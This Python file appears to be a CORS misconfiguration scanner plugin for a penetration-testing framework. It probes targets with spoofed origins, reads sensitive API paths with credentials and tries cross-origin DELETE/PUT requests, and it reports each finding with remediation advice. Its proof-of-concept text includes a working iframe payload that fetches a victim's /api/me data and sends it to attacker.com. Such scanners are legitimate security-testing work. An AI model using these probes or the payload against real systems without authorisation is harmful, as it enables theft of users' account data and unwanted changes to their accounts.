"""CORS misconfiguration detection — comprehensive origin trust analysis.

Tests for:
1. Origin: null trust (sandboxed iframe / data URI attack)
2. Attacker-controlled domain reflection (arbitrary origin)
3. Subdomain trust abuse (evil.sub.target.com)
4. Prefix/suffix bypass patterns (targetevil.com, evil-target.com)
5. Regex bypass attempts (target.com.evil.com, target.com%60.evil.com)
6. Wildcard (*) with Access-Control-Allow-Credentials: true
7. Pre-flight bypass via simple methods on dangerous endpoints
8. Credentialed cross-origin data exposure on sensitive API paths

Each finding includes a PoC description explaining the real-world impact.
"""

from __future__ import annotations

from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# Sensitive endpoints to probe for credentialed cross-origin data reads
SENSITIVE_PATHS = [
    "/api/user", "/api/me", "/api/profile", "/api/account",
    "/api/v1/user", "/api/v1/me", "/api/v1/account",
    "/api/v2/user", "/api/v2/me",
    "/user/info", "/account/settings", "/account/billing",
    "/graphql", "/api/graphql",
    "/api/config", "/api/keys", "/api/tokens",
    "/userinfo", "/oauth/userinfo",
]

# HTTP methods for pre-flight bypass testing
DANGEROUS_METHODS = ["PUT", "DELETE", "PATCH"]

# Custom headers that should trigger pre-flight but may be allowed
CUSTOM_HEADERS_TO_TEST = [
    "X-Custom-Header", "X-Requested-With", "Authorization",
]


def _build_bypass_origins(host: str) -> list[tuple[str, str, str]]:
    """Build origin bypass payloads with explanations.

    Returns list of (origin, bypass_type, description) tuples.
    """
    parts = host.split(".")
    domain = ".".join(parts[-2:]) if len(parts) >= 2 else host
    base = parts[-2] if len(parts) >= 2 else host

    return [
        # Null origin — exploitable via sandboxed iframe or data: URI
        ("null", "null_origin",
         "Origin: null accepted. Exploitable via sandboxed <iframe> or data: URI."),

        # Exact attacker domain — full reflection
        ("https://evil.com", "arbitrary_origin",
         "Arbitrary attacker origin reflected. Full cross-origin data theft possible."),

        # Subdomain trust — attacker controls any subdomain (e.g. via XSS on sub)
        (f"https://evil.{domain}", "subdomain_prefix",
         f"Subdomain prefix evil.{domain} trusted. "
         "XSS on any subdomain leads to cross-origin reads."),

        # Suffix bypass — regex anchoring failure: targetevil.com
        (f"https://{domain}.evil.com", "suffix_bypass",
         f"Suffix bypass {domain}.evil.com accepted. "
         "Regex does not anchor to end of origin correctly."),

        # Host embedded in subdomain of attacker domain
        (f"https://{host}.evil.com", "host_embed",
         f"Full host {host}.evil.com treated as trusted. "
         "Regex matches substring without boundary checks."),

        # Prefix bypass — regex anchoring failure: eviltarget.com
        (f"https://not{domain}", "prefix_bypass",
         f"Prefix bypass not{domain} accepted. "
         "Regex does not anchor to start of domain correctly."),

        # Prefix with hyphen — common in regex: evil-target.com
        (f"https://evil-{domain}", "hyphen_prefix",
         f"Hyphenated prefix evil-{domain} accepted. "
         "Character class [-.] in regex allows arbitrary prefix."),

        # Backtick encoding bypass (some parsers)
        (f"https://{domain}%60.evil.com", "backtick_bypass",
         "Encoded backtick bypass accepted. "
         "Server decodes %60 (backtick) allowing origin manipulation."),

        # Underscore bypass — underscore is valid in subdomains
        (f"https://{base}_.evil.com", "underscore_bypass",
         f"Underscore variant {base}_.evil.com accepted. "
         "Weak regex allows underscore as domain separator."),

        # Protocol downgrade — HTTP instead of HTTPS
        (f"http://{domain}", "protocol_downgrade",
         "HTTP origin accepted for HTTPS target. "
         "Attacker on insecure network can read cross-origin data."),

        # Wildcard subdomain of target — deeper nesting
        (f"https://a.b.c.{domain}", "deep_subdomain",
         f"Deeply nested subdomain a.b.c.{domain} trusted. "
         "Overly broad *.{domain} pattern allows any sub."),
    ]


def _generate_poc(bypass_type: str, origin: str, target_url: str) -> str:
    """Generate a PoC description for a specific CORS bypass."""
    pocs = {
        "null_origin": (
            "PoC: Create an HTML page with <iframe sandbox='allow-scripts' "
            f"src='data:text/html,<script>fetch(\"{target_url}/api/me\","
            "{credentials:\"include\"}).then(r=>r.text()).then(d=>"
            "fetch(\"https://attacker.com/steal?data=\"+btoa(d)))"
            "</script>'></iframe>. The sandboxed iframe sends Origin: null."
        ),
        "arbitrary_origin": (
            f"PoC: Host JavaScript on {origin} that performs: "
            f"fetch(\"{target_url}/api/me\", {{credentials: \"include\"}})"
            ".then(r => r.json()).then(data => exfiltrate(data)). "
            "Any attacker-controlled domain can read authenticated responses."
        ),
        "suffix_bypass": (
            f"PoC: Register domain "
            f"{origin.split('//')[1] if '//' in origin else origin} "
            f"and host JavaScript that reads {target_url} cross-origin "
            f"with credentials. The server regex matches the target domain "
            f"as a substring."
        ),
        "protocol_downgrade": (
            f"PoC: MitM on insecure network injects script on {origin} "
            f"that reads {target_url} cross-origin. HTTP origin accepted "
            "for HTTPS resource enables network-level attacks."
        ),
    }
    return pocs.get(bypass_type, (
        f"PoC: Host attacker page at {origin}, use fetch() with "
        f"credentials:include to read {target_url} cross-origin. "
        f"Bypass type: {bypass_type}."
    ))


class CorsExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="cors_exploit",
        display_name="CORS Misconfiguration Detection",
        category=PluginCategory.PENTESTING,
        description=(
            "Comprehensive CORS misconfiguration detection: null origin, "
            "attacker domains, subdomain trust, prefix/suffix/regex bypass, "
            "wildcard+credentials combo, pre-flight bypass, credentialed reads"
        ),
        produces=["cors_exploit_results"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"cors_exploits": []},
            )

        findings: list[Finding] = []
        exploits: list[dict] = []

        # Phase 1: Test origin bypass patterns against root
        bypass_results = await self._test_origin_bypasses(
            ctx, base_url, target.host,
        )
        for br in bypass_results:
            exploits.append(br)

            # Subdomain trust with credentials: HIGH (not CRITICAL)
            # Arbitrary origin with credentials: CRITICAL
            if br["has_credentials"] and br["bypass_type"] not in (
                "subdomain_prefix", "deep_subdomain",
            ):
                severity_fn = Finding.critical
            else:
                severity_fn = Finding.high
            poc = _generate_poc(br["bypass_type"], br["origin"], base_url)

            findings.append(severity_fn(
                f"CORS {br['bypass_type']}: {br['origin']}",
                description=(
                    f"{br['explanation']}\n\n{poc}"
                ),
                evidence=(
                    f"Request Origin: {br['origin']}\n"
                    f"ACAO: {br['acao']}\n"
                    f"ACAC: {br['acac']}\n"
                    f"Path: {br['path']}"
                ),
                remediation=(
                    "1. Validate Origin against a strict whitelist of exact values.\n"
                    "2. Never reflect arbitrary origins with credentials.\n"
                    "3. Do not use regex for origin matching — use exact comparison.\n"
                    "4. Reject 'null' origin unless specifically required.\n"
                    "5. Never combine Access-Control-Allow-Origin: * with "
                    "Access-Control-Allow-Credentials: true."
                ),
                tags=["pentesting", "cors", br["bypass_type"]],
            ))

        if ctx.should_stop:
            return self._make_result(target, findings, exploits)

        # Phase 2: Wildcard + Credentials combo check
        wildcard_result = await self._test_wildcard_credentials(ctx, base_url)
        if wildcard_result:
            exploits.append(wildcard_result)
            findings.append(Finding.high(
                "CORS: wildcard (*) with credentials indication",
                description=(
                    "Server returns Access-Control-Allow-Origin: * alongside "
                    "Access-Control-Allow-Credentials: true. While browsers block "
                    "this, some frameworks have bugs, and it signals a fundamentally "
                    "broken CORS configuration."
                ),
                evidence=(
                    f"ACAO: {wildcard_result['acao']}\n"
                    f"ACAC: {wildcard_result['acac']}"
                ),
                confidence=0.7,
                remediation=(
                    "Never use wildcard with credentials. "
                    "Specify exact allowed origins."
                ),
                tags=["pentesting", "cors", "wildcard-credentials"],
            ))

        if ctx.should_stop:
            return self._make_result(target, findings, exploits)

        # Phase 3: Credentialed cross-origin data reads on sensitive endpoints
        vuln_origins = [br["origin"] for br in bypass_results if br["has_credentials"]]
        if vuln_origins:
            read_results = await self._test_credentialed_reads(
                ctx, base_url, vuln_origins[0],
            )
            if read_results:
                exploits.extend(read_results)
                endpoints = ", ".join(r["path"] for r in read_results)
                total_bytes = sum(r["size"] for r in read_results)
                findings.append(Finding.critical(
                    "CORS: credentialed cross-origin data exposure",
                    description=(
                        f"Sensitive API endpoints return data to attacker origin "
                        f"{vuln_origins[0]} with credentials. "
                        f"An attacker can steal user data from: {endpoints}\n\n"
                        f"Total exposed data: {total_bytes} bytes across "
                        f"{len(read_results)} endpoints."
                    ),
                    evidence="\n".join(
                        f"  {r['path']} -> HTTP {r['status']} "
                        f"({r['size']} bytes)"
                        for r in read_results
                    ),
                    confidence=0.95,
                    verified=True,
                    remediation=(
                        "Fix the origin validation immediately. "
                        "Implement a strict allowlist. "
                        "Audit all API endpoints for CORS headers."
                    ),
                    tags=["pentesting", "cors", "data-exposure"],
                ))

        if ctx.should_stop:
            return self._make_result(target, findings, exploits)

        # Phase 4: Pre-flight bypass — dangerous methods with simple request
        preflight_results = await self._test_preflight_bypass(
            ctx, base_url,
        )
        if preflight_results:
            exploits.extend(preflight_results)
            findings.append(Finding.medium(
                "CORS: pre-flight bypass allows dangerous methods",
                description=(
                    "Dangerous HTTP methods (PUT/DELETE/PATCH) are accepted "
                    "cross-origin without pre-flight OPTIONS check. Attacker can "
                    "invoke state-changing operations from any origin."
                ),
                evidence="\n".join(
                    f"  {r['method']} {r['path']} -> "
                    f"ACAO={r['acao']} HTTP {r['status']}"
                    for r in preflight_results
                ),
                remediation=(
                    "Require custom headers (e.g. X-Requested-With) for "
                    "state-changing requests to force pre-flight. "
                    "Validate methods in Access-Control-Allow-Methods."
                ),
                tags=["pentesting", "cors", "preflight-bypass"],
            ))

        if ctx.should_stop:
            return self._make_result(target, findings, exploits)

        # Phase 5: Allowed headers leak (ACAH enumeration)
        header_results = await self._test_allowed_headers(ctx, base_url)
        if header_results:
            exploits.append(header_results)
            exposed = ", ".join(header_results.get("exposed_headers", []))
            findings.append(Finding.low(
                "CORS: overly permissive allowed/exposed headers",
                description=(
                    "Pre-flight response allows sensitive headers cross-origin. "
                    f"Exposed: {exposed}"
                ),
                evidence=(
                    f"ACAH: {header_results.get('allow_headers', '')}\n"
                    f"ACEH: {header_results.get('expose_headers', '')}"
                ),
                remediation="Restrict allowed and exposed headers to minimum needed.",
                tags=["pentesting", "cors", "headers"],
            ))

        if not findings:
            findings.append(Finding.info(
                "No CORS misconfigurations detected",
                tags=["pentesting", "cors"],
            ))

        return self._make_result(target, findings, exploits)

    def _make_result(
        self,
        target: Target,
        findings: list[Finding],
        exploits: list[dict],
    ) -> PluginResult:
        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "cors_exploits": exploits,
                "total_bypasses": len([
                    e for e in exploits if isinstance(e, dict) and "bypass_type" in e
                ]),
            },
        )

    async def _test_origin_bypasses(
        self, ctx, base_url: str, host: str,
    ) -> list[dict]:
        """Test all origin bypass patterns against multiple paths."""
        results: list[dict] = []
        seen_types: set[str] = set()
        bypass_origins = _build_bypass_origins(host)
        test_paths = ["/", "/api/", "/api/v1/"]

        for path in test_paths:
            if ctx.should_stop:
                break
            for origin, bypass_type, explanation in bypass_origins:
                if ctx.should_stop or bypass_type in seen_types:
                    break
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(
                            f"{base_url}{path}",
                            headers={"Origin": origin},
                            timeout=8.0,
                        )
                        acao = resp.headers.get(
                            "Access-Control-Allow-Origin", "",
                        )
                        acac = resp.headers.get(
                            "Access-Control-Allow-Credentials", "",
                        )

                        # Check if the origin is reflected or wildcard
                        origin_accepted = (
                            acao == origin
                            or (origin == "null" and acao == "null")
                        )

                        if origin_accepted:
                            seen_types.add(bypass_type)
                            results.append({
                                "bypass_type": bypass_type,
                                "origin": origin,
                                "path": path,
                                "acao": acao,
                                "acac": acac,
                                "has_credentials": acac.lower() == "true",
                                "explanation": explanation,
                                "status": resp.status,
                            })
                except Exception:
                    continue

        return results

    async def _test_wildcard_credentials(
        self, ctx, base_url: str,
    ) -> dict | None:
        """Check for wildcard + credentials combo."""
        test_paths = ["/", "/api/", "/api/v1/"]
        for path in test_paths:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}",
                        headers={"Origin": "https://check-wildcard.test"},
                        timeout=8.0,
                    )
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get(
                        "Access-Control-Allow-Credentials", "",
                    )

                    if acao == "*" and acac.lower() == "true":
                        return {
                            "bypass_type": "wildcard_credentials",
                            "path": path,
                            "acao": acao,
                            "acac": acac,
                        }
            except Exception:
                continue
        return None

    async def _test_credentialed_reads(
        self, ctx, base_url: str, evil_origin: str,
    ) -> list[dict]:
        """Test sensitive endpoints for data leakage with a confirmed bypass origin."""
        results: list[dict] = []

        for path in SENSITIVE_PATHS:
            if ctx.should_stop or len(results) >= 5:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}",
                        headers={"Origin": evil_origin},
                        timeout=8.0,
                    )
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get(
                        "Access-Control-Allow-Credentials", "",
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")

                    if (
                        resp.status == 200
                        and acao == evil_origin
                        and acac.lower() == "true"
                        and len(body) > 50
                    ):
                        # Check if response looks like it contains user data
                        has_data = any(
                            indicator in body.lower()
                            for indicator in (
                                "email", "username", "name", "token",
                                "api_key", "apikey", "secret", "password",
                                "phone", "address", "role", "admin",
                            )
                        )
                        results.append({
                            "type": "credentialed_read",
                            "path": path,
                            "status": resp.status,
                            "size": len(body),
                            "acao": acao,
                            "contains_pii": has_data,
                            "content_type": resp.headers.get(
                                "Content-Type", "unknown",
                            ),
                        })
            except Exception:
                continue
        return results

    async def _test_preflight_bypass(
        self, ctx, base_url: str,
    ) -> list[dict]:
        """Test if dangerous methods work cross-origin without proper pre-flight."""
        results: list[dict] = []
        evil_origin = "https://evil.com"
        test_paths = ["/api/user", "/api/data", "/api/account", "/"]

        for path in test_paths:
            if ctx.should_stop:
                break

            # First: OPTIONS pre-flight to see what's allowed
            try:
                async with ctx.rate:
                    options_resp = await ctx.http.request(
                        "OPTIONS",
                        f"{base_url}{path}",
                        headers={
                            "Origin": evil_origin,
                            "Access-Control-Request-Method": "DELETE",
                            "Access-Control-Request-Headers": "Authorization",
                        },
                        timeout=8.0,
                    )
                    acam = options_resp.headers.get(
                        "Access-Control-Allow-Methods", "",
                    )
                    acao = options_resp.headers.get(
                        "Access-Control-Allow-Origin", "",
                    )

                    # If pre-flight allows dangerous methods from evil origin
                    if acao in (evil_origin, "*"):
                        for method in DANGEROUS_METHODS:
                            if method in acam.upper() or acam == "*":
                                results.append({
                                    "type": "preflight_allows_method",
                                    "method": method,
                                    "path": path,
                                    "acao": acao,
                                    "acam": acam,
                                    "status": options_resp.status,
                                })
            except Exception:
                pass

            # Second: Try actual dangerous methods with simple content-type
            for method in DANGEROUS_METHODS:
                if ctx.should_stop:
                    break
                try:
                    async with ctx.rate:
                        resp = await ctx.http.request(
                            method,
                            f"{base_url}{path}",
                            headers={
                                "Origin": evil_origin,
                                "Content-Type": "text/plain",
                            },
                            timeout=8.0,
                        )
                        acao = resp.headers.get(
                            "Access-Control-Allow-Origin", "",
                        )
                        if acao == evil_origin and resp.status < 500:
                            results.append({
                                "type": "preflight_bypass",
                                "method": method,
                                "path": path,
                                "acao": acao,
                                "status": resp.status,
                            })
                except Exception:
                    continue

        # Deduplicate by (method, path)
        seen: set[tuple[str, str]] = set()
        deduped: list[dict] = []
        for r in results:
            key = (r["method"], r["path"])
            if key not in seen:
                seen.add(key)
                deduped.append(r)
        return deduped

    async def _test_allowed_headers(
        self, ctx, base_url: str,
    ) -> dict | None:
        """Check what headers are allowed and exposed cross-origin."""
        sensitive_headers = {"authorization", "cookie", "x-api-key", "x-csrf-token"}
        try:
            async with ctx.rate:
                resp = await ctx.http.request(
                    "OPTIONS",
                    f"{base_url}/",
                    headers={
                        "Origin": "https://check.test",
                        "Access-Control-Request-Method": "GET",
                        "Access-Control-Request-Headers": ", ".join(
                            CUSTOM_HEADERS_TO_TEST,
                        ),
                    },
                    timeout=8.0,
                )
                allow_headers = resp.headers.get(
                    "Access-Control-Allow-Headers", "",
                )
                expose_headers = resp.headers.get(
                    "Access-Control-Expose-Headers", "",
                )

                # Parse into sets
                allowed = {
                    h.strip().lower() for h in allow_headers.split(",") if h.strip()
                }
                exposed = {
                    h.strip().lower() for h in expose_headers.split(",") if h.strip()
                }

                # Check for overly permissive settings
                is_permissive = (
                    allow_headers.strip() == "*"
                    or bool(allowed & sensitive_headers)
                    or bool(exposed & sensitive_headers)
                )

                if is_permissive:
                    return {
                        "allow_headers": allow_headers[:200],
                        "expose_headers": expose_headers[:200],
                        "exposed_headers": sorted(exposed & sensitive_headers),
                        "sensitive_allowed": sorted(allowed & sensitive_headers),
                    }
        except Exception:
            pass
        return None
